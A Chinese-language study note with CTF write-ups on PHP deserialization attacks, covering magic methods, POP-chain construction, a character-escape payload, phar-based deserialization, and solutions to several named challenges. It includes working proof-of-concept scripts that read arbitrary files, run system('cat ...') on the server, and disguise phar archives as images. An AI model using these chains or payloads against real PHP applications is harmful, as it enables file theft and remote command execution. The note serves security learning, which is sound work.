---
author: "Yiming Shen"
date: 2022-06-11
lastmod: 2022-07-18
title: "PHP 反序列化"
tags: [
    "CTF",
    "PHP",
    "Web",
    "Note",
    "Unserialize",
]
categories: [
    "Notes",
     "CTF",
]
showtoc: true
math: true
typora-root-url: ..\..\..\..\static\
---

## 基础知识

1. 常见PHP魔术函数

``` php
__construct() //当一个对象创建时被调用

__destruct() //当一个对象销毁时被调用

__wakeup() //使用unserialize时触发

__sleep() //使用serialize时触发

__destruct() //对象被销毁时触发

__call() //在对象上下文中调用不可访问的方法时触发

__get() //用于从不可访问的属性读取数据

__set() //用于将数据写入不可访问的属性

__toString() //把类当作字符串使用时触发

__invoke() //当脚本尝试将对象调用为函数时触发
```

> 审POP链的过程，需要熟练掌握魔术函数。

2. 掌握面向对象概念以及PHP中的类与对象

## 序列化与反序列化

> **序列化**：把对象转换为字节序列的过程，便于存储或传输。
>
> **反序列化**：把字节序列恢复为对象的过程。

### 漏洞可能出现的位置

1.解析认证token、session的位置

2.将序列化的对象存储到磁盘文件或存入数据库后反序列化时的位置，如读取json文件，xml文件等

3.将对象序列化后在网络中传输，如传输json数据，xml数据等

4.参数传递给程序

5.使用RMI协议，被广泛使用的RMI协议完全基于序列化

6.使用了不安全的框架或基础类库，如JMX 、Fastjson和Jackson等

7.定义协议用来接收与发送原始的java对象

### 原理

在程序将字节序列恢复为对象的过程中，信任了可能被第三方篡改过的字节序列（内容可控），在将其反序列化的过程中，通过触发魔术方法（Python、PHP）或反射机制（JAVA），实现传入任意参数调用方法（POP链利用）。

### 序列化后的对象字符串

```php
O:1:"A":1:{s:7:"%00A%00name";s:6:"As1def";}

// O代表这是一个对象，第一个1代表对象名称的长度，第二个1代表成员个数。
// 大括号中分别是：属性名类型、长度、名称;值类型、长度、值。
// s代表string类型
// 另外还有b=>bool  i=>int  d=>double  a=>array r=>对象引用 R=> 指针引用 N=>NULL;

// 有%00是加上protected或private关键字限定的类变量，这种类变量在进行反序列化操作时需要对其进行URL编码，否则存在%0A错误解析成截断的可能性。
```

## POP链构造

> POP（Property-Oriented Programing）面向属性编程，用于上层语言构造特定调用链的方法，从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构造一组连续的调用链，达到攻击者恶意利用的目的。

即构造一条完整的调用链，通过控制对象的属性实现控制程序的执行流程，达到利用无害代码实现有害操作的目的。

### 实例

```php
<?php
//flag is in flag.php
error_reporting(1);
class Read {
    public $var;
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
    public function __invoke(){
        $content = $this->file_get($this->var);
        echo $content;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file='index.php')
    {
        $this->source = $file;
        echo $this->source.'Welcome'."<br>";
    }
    public function __toString()
    {
        return $this->str['str']->source;
    }

    public function _show()
    {
        if(preg_match('/gopher|http|ftp|https|dict|\.\.|flag|file/i',$this->source)) {
            die('hacker');
        } else {
            highlight_file($this->source); 
        }

    }

    public function __wakeup()
    {
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test
{
    public $p;
    public function __construct()
    {
        $this->p = array();
    }

    public function __get($key)
    {
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['hello']))
{
    unserialize($_GET['hello']);
}
else
{
    $show = new Show('pop3.php');
    $show->_show();
}
```

#### 分析思路

- 先找到能利用的点：Read.file_get里的file_get_contents可以获取文件，在作为对象函数执行（`__invoke`）时可读取文件。
- 可控的是`get`传入的hello参数，将hello值反序列化，此时会调用`__wakeup`方法，只有Show类中存在该方法。`\_\_wakeup`方法中会对`$this->source`进行正则匹配，此时会将`source`的内容当作字符串处理，即调用`__toString()`方法。
- `__toString`方法中读取了`$this->str['str']->source`，如果`str['str']`对象中没有`source`这个变量呢？此时就会调用`__get`魔术方法（如果该对象存在这个方法的话）。
- 观察程序，发现只有Test类有`__get`方法，用Test类继续构造POP链，会调用`$this->p`变量，并将`$this->p`作为函数执行，此时就来到了我们找到的利用点——Read类中的`__invoke`魔术方法！

如此，我们构造好了一条POP链：

`$_GET['hello']->Show.__wakeup->Show.__toString->Test.__get->Read.__invoke->Read.file_get->读取任意文件`

得到POC

```php
<?php
    class Read{
        public $var = "flag.php";
    }
    class Show{
        public $source;
        public $str;
    }

    class Test{
        public $p;
    }

    $read = new Read();
    $show = new Show();
    $test = new Test();

    $show->str['str']=$test; 
    $test->p=$read;
    echo serialize($show);
    echo '
    ';
    $show->source=$show; //这个地方是为了触发Show类中的__toString方法，因为正则判断是对source进行字符串化
    echo serialize($show);
?>
```

#### 总结

1. 先观察是否存在利用点
   1. 可执行命令、文件包含的敏感函数
   2. 参数可控的变量、入口
2. 注意所有魔术方法
3. 将魔术方法执行顺序连成一条链
4. 确定对象调用顺序，填入对象变量参数，构造POP链

## 题目

### [[网鼎杯 2020 青龙组\]AreUSerialz](https://buuoj.cn/challenges#[网鼎杯 2020 青龙组]AreUSerialz)

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

观察发现，有反序列化入口，为传入的get参数$str

会先检查ASCII码是否符合条件，而类FileHandler中的三个变量均为Protected类型，序列化后会有`\x00*\x00`标识，而`\x00`的ASCII码值为0，不符合条件。

#### **利用PHP特性绕过反序列化限制**

1. PHP 7.1+版本对属性类型不敏感，可将Protected直接换成Public也可反序列化。
2. 可用S代替s，如此可支持解析16进制文本，即将非ASCII文本变成16进制文本

#### PHP 弱类型绕过

类中有一个析构函数`__destruct`，在对象销毁后，会执行一次写文件覆盖操作，需要绕过。

注意到析构函数中判断使用的是强类型相等`===`，而`process`类中的判断时弱类型相等`==`，可以利用PHP语言特性绕过：`"2"==2,2!==="2"`

令`$op=2`而不是`"2"`即可

#### 构造POC

```php
<?php

use FileHandler as GlobalFileHandler;

    class FileHandler{
        public $op=2;
        public $filename="flag.php";
        public $content;
    }

    $fileHandler = new FileHandler();
    echo serialize($fileHandler);
?>
```

得到

`O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;} `

执行查看源代码即得到Flag。



### [[网鼎杯 2020 朱雀组\]phpweb](https://buuoj.cn/challenges#[网鼎杯 2020 朱雀组]phpweb)

进入题目环境后查看源代码，有两个隐藏的表单输入框，同时定时每5秒提交表单，抓包并分析报错可知，是`call_user_func`方法，第一个参数是要调用的函数名，第二个参数是要调用的函数的参数。

直接`highlight_file`读取本页面源码，得到：

```php
<?php
// phpweb poc
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```

无过滤，直来直去，直接构造POC

```php
<?php
    class Test{
        // var $p = "find / -name flag*"; 先查一下服务器中含有flag的文件名，找到位置
        var $p = "cat /tmp/flagoefiu4r93";

        var $func = "system";
        
    }
    $test = new Test ();
    
    echo urlencode(serialize($test));
?>
```

### [安洵杯 2019] easy_serialize_php



```php
<?php
// 	d0g3_f1ag.php
$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

1. 先查看phpinfo，发现敏感文件泄露：`d0g3_f1ag.php`，即使用`file_get_contents`读该文件
2. 存在过滤，以及使用sha1函数替换了用户传入的`img_path`，sha1和base64应该是不太可能碰撞的，考虑绕过过滤。
3. 过滤方式是简单替换为空，存在绕过的可能。

#### 知识点

1. 本题的`$_SESSION`其实并不是PHP的自带变量，而是用户定义的变量，我们在`extract($_POST)`这里通过POST方式控制其内容。

2. **不是只有类和对象才有序列化和反序列化**，类、对象、数组、变量均可进行序列化。

   ```php
   a - array
   b - boolean
   d - double
   i - integer
   o - common object
   r - reference
   s - string
   C - custom object
   O - class
   N - null
   R - pointer reference
   U - unicode string
   ```

3. PHP进行反序列化时，并不要求字符串严格按照格式，而是按照从左至右的顺序和预先安排的字符个数进行依次读取。

   故而在未遇到字符串尾：`;`和读满字符个数之前，会将遇到的所有字符当作相应的对象名或内容。

#### PHP 反序列化字符逃逸

> 字符逃逸的本质即为闭合。分为两种情况，一是字符变多，二是字符变少。

本题存在过滤后字符变少的情况。

由于程序会将`$_SESSION['img']`设置为固定值，我们要控制改变这里的值，需要让程序错位读取我们设置的值。

- 我们希望的`img`序列化结果(读取base64编码后的`d0g3_f1ag.php`)：

  `s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";`

- 我们可以在程序反序列化时，添加一个新的数组元素，覆盖掉原有的img元素，类似于SQL注入

  `$_SESSION['xx']='";s:3:"abc";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'`

- `$_SESSION`序列化后：

  ` a:1:{s:2:"xx";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";}`

- 此时数一下多余的字符数：`;s:51:""`为8个，可用`flagflag`拼凑

- ` a:1:{s:8:"flagflag";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";}`

- 被过滤后，变成了：` a:1:{s:8:"";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";}`，此时，原先多余的八个字符正好会被当作第一个元素的名字，而`s:3:"aaa"`即为它的值，而后面的`img`参数能被正常解析成功！

**Payload**

POST： `$_SESSION['flagflag']=";s:3:"abc";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}`

(去掉两个单引号是因为http协议中的post请求无需用引号覆盖，而PHP的字符串内容需要单引号)

### [MRCTF2020]Ezpop

本题与POP链构造的实例相同，需要注意的是最后的文件读取用的是文件包含`include`的函数，故而需要用到文件包含的`php://filter`伪协议。

**POC**

```php
<?php
    class Modifier{
        protected $var='php://filter/convert.base64-encode/resource=flag.php';
    }
    class Show{
        public $source;
        public $str;
        public function __construct($file='flag.php'){
            $this->source = $file;
            // echo 'Welcome to '.$this->source."<br>";
        }
    }
    class Test{
        public $p;

    }
    $modifier = new Modifier();
    $show = new Show();
    $test = new Test();
    $test->p = $modifier;
    $show->str = $test;
    $show->source = $show;
    echo urlencode(serialize($show));
?>
```

### [SWPUCTF 2018]SimplePHP

本题考察知识点为

- 文件包含
- 利用Phar进行反序列化

进入题目，发现存在一个文件包含和一个文件上传点，先利用文件包含读取`file.php`和`upload_file.php`的源代码，发现文件上传过滤严格，似乎不存在可以绕过的漏洞，只能上传图片格式。而`file.php`中还包含了`function.php`和`class.php`，第一个提示flag在`f1ag.php`中，第二个则明显是要进行POP链的构造。

`class.php`内容

```php
<?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        // 在给不可访问（protected 或 private）或不存在的属性赋值时 调用Set
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
?>
```

标注出所有魔术方法后，可以找到如下的POP链：

`C1e4r.__destruct->Show.__set->Show.__toString->Test.params[$key]->Test.file_get`

即可构造POP链

```php
<?php
class C1e4r
{
    public $test;
    public $str;
}

class Show
{
    public $source;
    public $str;
}

class Test
{
    public $file;
    public $params;
}
$c1e4r = new C1e4r();
$show = new Show();
$test = new Test();
$c1e4r->str = $show;
$show->str['str'] = $test;
$test->params['source'] = 'f1ag.php';
?>
```

但是，反序列化入口在哪里？所有的源代码中都没有反序列化函数`unserialize`

#### Phar反序列化

这时候，就要利用隐藏的反序列化入口-`Phar://`

> `Phar`方法在 文件系统函数 （ file_get_contents 、 unlink 等）参数可控的情况下，配合 phar://伪协议 ，可以不依赖反序列化函数 unserialize() 直接进行反序列化的操作。

PHP大部分的文件系统函数在通过`phar://`伪协议解析`phar`包文件时，都会将文件结构中`meta-data`的部分进行反序列化。

同时， `phar `文件必须以`__HALT_COMPILER();?>`来结尾，那么**可以通过添加任意的文件头+修改后缀名的方式将`phar`文件伪装成其他格式的文件。**

生成`Phar`包文件的代码是固定的：

```php
$phar = new Phar("exp.phar"); //生成.phar文件，此处填写的后缀名必须是.phar，但phar://协议不限于只解析.phar文件
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >'); //固定的，可以在此处添加伪造的文件头
$phar->setMetadata($c1e4r); //触发的头是C1e4r类，所以传入C1e4r对象，此处即为对$c1e4r进行序列化的操作
$phar->addFromString("exp.txt", "test"); //随便写，生成签名
$phar->stopBuffering();
```

完成后便会生成在同目录下生成一个`exp.phar`文件，手动修改文件拓展名为`.jpg`（之前查看`upload_file.php`源代码发现没有检查文件头，故更改文件后缀即可），上传，找到位置，在文件包含处使用`phar://`协议包含该jpg文件，即可通过POP链读取flag文件。

#### Phar反序列化的条件

根据该题，可以总结出需要满足以下三个条件：

1. 需要存在POP链，末端可以获得flag的方法
2. 需要文件上传入口，上传`phar`包
3. 需要文件包含，利用`phar://`伪协议读取`phar`包

除此之外，`Postgresql`和`Mysql`中也都有函数可以利用`phar://`伪协议进行反序列化操作。









## 参考

1. [PHP反序列化和POP链构造 - As1def's Blog](https://as1def.github.io/2020/10/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CPOP%E9%93%BE%E6%9E%84%E9%80%A0/)
2. [一题教你学会构造PHP反序列化POP链 - FreeBuf](https://www.freebuf.com/articles/web/247930.html)
3. [BUUCTF刷题——PHP反序列化 - CA01H' Blog](https://ca01h.top/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)
4. [PHP 反序列化字符逃逸 - 先知社区](https://xz.aliyun.com/t/9213)
5. [PHP反序列化拓展攻击Phar详解 - 先知社区](https://xz.aliyun.com/t/6699)

